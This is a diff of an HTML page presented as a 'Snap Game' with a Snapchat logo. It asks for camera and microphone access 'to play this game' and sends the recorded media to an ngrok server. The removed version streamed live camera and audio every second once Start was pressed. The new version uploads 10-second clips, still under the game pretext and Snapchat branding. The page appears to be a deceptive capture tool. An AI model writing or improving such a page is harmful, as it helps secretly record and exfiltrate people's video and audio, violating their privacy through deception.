@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Snap Game</title>
+<title>Snap Game - Video Recorder</title>
 
 <style>
 body {
@@ -12,7 +12,7 @@ body {
   overflow: hidden;
 }
 
-/* 🟡 Splash */
+/* Splash Screen */
 #splash {
   position: fixed;
   width: 100%;
@@ -22,22 +22,21 @@ body {
   align-items: center;
   justify-content: center;
   flex-direction: column;
+  z-index: 1000;
 }
 
-/* Logo */
 #logo {
   width: 120px;
   height: 120px;
   object-fit: contain;
 }
 
-/* Text */
 #tap {
   margin-top: 20px;
   font-size: 16px;
+  color: #333;
 }
 
-/* Button */
 #startBtn {
   margin-top: 15px;
   padding: 12px 20px;
@@ -46,16 +45,16 @@ body {
   background: black;
   color: white;
   font-size: 16px;
+  cursor: pointer;
 }
 
-/* Error message */
 #message {
   margin-top: 10px;
   color: red;
   font-size: 14px;
 }
 
-/* Camera */
+/* Camera View */
 #camera {
   width: 100%;
   height: 100vh;
@@ -63,7 +62,7 @@ body {
   display: none;
 }
 
-/* Capture button */
+/* Recording Button */
 .capture-btn {
   position: fixed;
   bottom: 40px;
@@ -75,97 +74,308 @@ body {
   background: white;
   border: 5px solid rgba(255,255,255,0.5);
   display: none;
+  cursor: pointer;
+  z-index: 100;
+}
+
+.capture-btn.recording {
+  background: #ff4444;
+  animation: pulse 1s infinite;
+}
+
+@keyframes pulse {
+  0% {
+    transform: translateX(-50%) scale(1);
+    opacity: 1;
+  }
+  50% {
+    transform: translateX(-50%) scale(1.1);
+    opacity: 0.7;
+  }
+  100% {
+    transform: translateX(-50%) scale(1);
+    opacity: 1;
+  }
+}
+
+/* Status Indicator */
+#status {
+  position: fixed;
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(0,0,0,0.7);
+  color: white;
+  padding: 8px 16px;
+  border-radius: 20px;
+  font-size: 14px;
+  display: none;
+  z-index: 100;
+  font-family: monospace;
+}
+
+.countdown {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 80px;
+  color: white;
+  text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+  z-index: 200;
+  display: none;
+  font-weight: bold;
 }
 </style>
 </head>
 
 <body>
 
-<!-- 🟡 Splash Screen -->
+<!-- Splash Screen -->
 <div id="splash">
-
-  <!-- ✅ Your downloaded logo -->
-  <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo">
-
+  <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo" onerror="this.src='https://via.placeholder.com/120?text=Snap'">
   <div id="tap">Tap to play game</div>
-
   <button id="startBtn" onclick="startApp()">Start</button>
-
   <div id="message"></div>
-
 </div>
 
-<!-- 📸 Camera -->
-<video id="camera" autoplay playsinline></video>
+<!-- Camera -->
+<video id="camera" autoplay playsinline muted></video>
 
-<!-- Capture UI -->
-<div class="capture-btn"></div>
+<!-- Capture Button -->
+<div class="capture-btn" onclick="toggleRecording()"></div>
+
+<!-- Status -->
+<div id="status">Ready</div>
+<div class="countdown" id="countdown"></div>
 
 <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
 
 <script>
-// 🔌 Backend URL
+// Configuration
 const BACKEND_URL = "https://tableware-dweeb-estate.ngrok-free.dev";
+let socket = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+let stream = null;
+let isRecording = false;
+let recordingTimer = null;
 
-const socket = io(BACKEND_URL, {
-  transports: ['websocket', 'polling']
-});
+// Connect to server
+function connectSocket() {
+  return new Promise((resolve, reject) => {
+    socket = io(BACKEND_URL, {
+      transports: ['websocket', 'polling'],
+      timeout: 10000
+    });
+    
+    socket.on('connect', () => {
+      console.log('✅ Connected to server');
+      document.getElementById('message').innerHTML = '';
+      resolve();
+    });
+    
+    socket.on('connect_error', (err) => {
+      console.error('Connection error:', err);
+      reject(err);
+    });
+    
+    socket.on('recording-complete', (data) => {
+      console.log('Recording saved:', data);
+      showStatus('✅ Video saved!');
+    });
+  });
+}
 
-let mediaRecorder;
-
-function startApp() {
+// Start the app
+async function startApp() {
   const splash = document.getElementById("splash");
   const camera = document.getElementById("camera");
   const btn = document.querySelector(".capture-btn");
   const msg = document.getElementById("message");
-
-  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-    .then(stream => {
-
-      msg.innerText = "";
-
-      camera.srcObject = stream;
-      camera.style.display = "block";
-      btn.style.display = "block";
-      splash.style.display = "none";
-
-      socket.emit('start-stream');
-
-      // 🔥 FIX: proper codec
-      const mimeType = 'video/webm; codecs=vp8,opus';
-
-      mediaRecorder = new MediaRecorder(stream, {
-        mimeType: MediaRecorder.isTypeSupported(mimeType)
-          ? mimeType
-          : 'video/webm'
-      });
-
-      mediaRecorder.ondataavailable = async (event) => {
-
-        if (event.data && event.data.size > 0) {
-
-          // 🔥 IMPORTANT FIX HERE
-          const buffer = await event.data.arrayBuffer();
-
-          socket.emit('stream-data', buffer);
-        }
-      };
-
-      mediaRecorder.start(1000);
-
-      window.onbeforeunload = () => {
-        mediaRecorder.stop();
-        socket.emit('stop-stream');
-      };
-
-    })
-    .catch(err => {
-      console.error(err);
-
-      msg.innerText = "⚠️ Please allow camera to play this game";
-      document.getElementById("startBtn").innerText = "Try Again";
+  
+  try {
+    // Connect to server first
+    showStatus('Connecting to server...');
+    await connectSocket();
+    
+    // Get camera access
+    showStatus('Requesting camera...');
+    stream = await navigator.mediaDevices.getUserMedia({ 
+      video: true, 
+      audio: true 
     });
+    
+    // Setup camera
+    camera.srcObject = stream;
+    camera.style.display = "block";
+    btn.style.display = "block";
+    splash.style.display = "none";
+    showStatus('Ready to record');
+    
+    // Setup media recorder
+    setupMediaRecorder();
+    
+  } catch (err) {
+    console.error('Error:', err);
+    msg.innerText = "⚠️ Please allow camera and microphone to play this game";
+    document.getElementById("startBtn").innerText = "Try Again";
+    showStatus('Error: ' + err.message);
+  }
 }
+
+// Setup MediaRecorder
+function setupMediaRecorder() {
+  // Find supported MIME type
+  const mimeTypes = [
+    'video/webm;codecs=vp9,opus',
+    'video/webm;codecs=vp8,opus',
+    'video/webm;codecs=h264,opus',
+    'video/webm'
+  ];
+  
+  let selectedMimeType = '';
+  for (const mimeType of mimeTypes) {
+    if (MediaRecorder.isTypeSupported(mimeType)) {
+      selectedMimeType = mimeType;
+      break;
+    }
+  }
+  
+  console.log('Using MIME type:', selectedMimeType);
+  
+  mediaRecorder = new MediaRecorder(stream, {
+    mimeType: selectedMimeType
+  });
+  
+  mediaRecorder.ondataavailable = (event) => {
+    if (event.data && event.data.size > 0) {
+      recordedChunks.push(event.data);
+    }
+  };
+  
+  mediaRecorder.onstop = () => {
+    if (recordedChunks.length > 0) {
+      sendVideoToServer();
+    }
+  };
+  
+  mediaRecorder.onerror = (err) => {
+    console.error('Recorder error:', err);
+    showStatus('Recording error');
+  };
+}
+
+// Toggle recording
+function toggleRecording() {
+  if (!mediaRecorder) return;
+  
+  if (!isRecording) {
+    startRecording();
+  } else {
+    stopRecording();
+  }
+}
+
+// Start recording with countdown
+function startRecording() {
+  recordedChunks = [];
+  
+  // Show countdown
+  let count = 3;
+  const countdownEl = document.getElementById('countdown');
+  countdownEl.style.display = 'block';
+  countdownEl.textContent = count;
+  
+  const countdownInterval = setInterval(() => {
+    count--;
+    if (count > 0) {
+      countdownEl.textContent = count;
+    } else {
+      clearInterval(countdownInterval);
+      countdownEl.style.display = 'none';
+      
+      // Start recording
+      mediaRecorder.start(1000); // Collect data every second
+      isRecording = true;
+      document.querySelector('.capture-btn').classList.add('recording');
+      showStatus('🔴 Recording... (max 10 seconds)');
+      
+      // Auto-stop after 10 seconds
+      recordingTimer = setTimeout(() => {
+        if (isRecording) {
+          stopRecording();
+        }
+      }, 10000);
+    }
+  }, 1000);
+}
+
+// Stop recording
+function stopRecording() {
+  if (recordingTimer) {
+    clearTimeout(recordingTimer);
+    recordingTimer = null;
+  }
+  
+  if (mediaRecorder && mediaRecorder.state === 'recording') {
+    mediaRecorder.stop();
+    isRecording = false;
+    document.querySelector('.capture-btn').classList.remove('recording');
+    showStatus('Processing video...');
+  }
+}
+
+// Send video to server
+async function sendVideoToServer() {
+  if (recordedChunks.length === 0) {
+    showStatus('No video data');
+    return;
+  }
+  
+  showStatus('Uploading video...');
+  
+  // Create blob from chunks
+  const mimeType = mediaRecorder.mimeType;
+  const videoBlob = new Blob(recordedChunks, { type: mimeType });
+  
+  // Convert to array buffer
+  const arrayBuffer = await videoBlob.arrayBuffer();
+  
+  // Emit to server
+  socket.emit('video-data', arrayBuffer);
+  
+  // Clear chunks
+  recordedChunks = [];
+  
+  showStatus('Video sent! Ready for next recording');
+}
+
+// Show status message
+function showStatus(message) {
+  const statusEl = document.getElementById('status');
+  statusEl.textContent = message;
+  statusEl.style.display = 'block';
+  
+  setTimeout(() => {
+    if (statusEl.textContent === message) {
+      statusEl.style.display = 'none';
+    }
+  }, 3000);
+}
+
+// Clean up on page unload
+window.onbeforeunload = () => {
+  if (mediaRecorder && mediaRecorder.state === 'recording') {
+    mediaRecorder.stop();
+  }
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+  if (socket) {
+    socket.disconnect();
+  }
+};
 </script>
 
 </body>
